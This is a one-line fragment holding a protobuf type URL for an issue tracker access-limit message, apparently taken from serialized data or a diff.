+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
